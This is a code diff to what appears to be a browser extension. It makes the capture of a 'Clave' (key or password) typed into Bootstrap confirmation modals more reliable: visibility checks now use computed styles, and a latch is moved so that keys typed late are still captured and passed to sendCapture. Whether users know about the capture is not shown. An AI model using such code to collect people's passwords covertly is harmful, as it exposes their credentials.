@@ -237,10 +237,23 @@ function getClaveCompleteValue() {
 }
 
 function isElementVisible(target) {
+    // Los formularios de confirmacion viven dentro de modales de Bootstrap
+    // (`.modal.fade`), que se ocultan con `display:none` desde la CLASE .modal,
+    // no con un style inline. Mirar solo el style inline y el aria-hidden daba
+    // falsos positivos durante la animacion fade (Bootstrap deja display:block
+    // inline y quita aria-hidden unos ~200ms antes/despues de cerrar). Por eso
+    // se comprueba tambien el display/visibility calculados, que si reflejan el
+    // display:none de la clase. getComputedStyle no existe en el DOM simulado de
+    // las pruebas: ahi se cae al chequeo por atributos, que basta para el stub.
+    const canComputeStyle = typeof getComputedStyle === 'function';
     for (let node = target; node; node = node.parentElement) {
         if (node.hidden || (node.getAttribute && node.getAttribute('aria-hidden') === 'true')) return false;
         const style = String((node.getAttribute && node.getAttribute('style')) || '').replace(/\s+/g, '').toLowerCase();
         if (style.includes('display:none') || style.includes('visibility:hidden')) return false;
+        if (canComputeStyle && node.nodeType === 1) {
+            const computed = getComputedStyle(node);
+            if (computed && (computed.display === 'none' || computed.visibility === 'hidden')) return false;
+        }
     }
     return true;
 }
@@ -283,11 +296,19 @@ function checkEntregaConfirmation() {
     }
 
     if (state.entregaConfirmed) return;
-    state.entregaConfirmed = true;
 
+    // El latch `entregaConfirmed` debe activarse SOLO cuando de verdad se
+    // capturo una clave. Antes se marcaba antes de leer el buffer: si un modal
+    // de confirmacion pasaba el chequeo de visibilidad con el buffer aun vacio
+    // (animacion fade de Bootstrap, u otra operacion en curso), quedaba
+    // latcheado y la extension NO reintentaba aunque la clave se tecleara
+    // despues, hasta que el modal se ocultara del todo. Eso es el "a veces deja
+    // de capturar": la clave real se perdia. Ahora, con buffer vacio no se
+    // latchea y el siguiente disparo del observador reintenta.
     const value = getClaveCompleteValue();
     if (!value) return;
 
+    state.entregaConfirmed = true;
     sendCapture('Clave', value, match.id, Date.now());
     state.claveBuffer = {};
 }
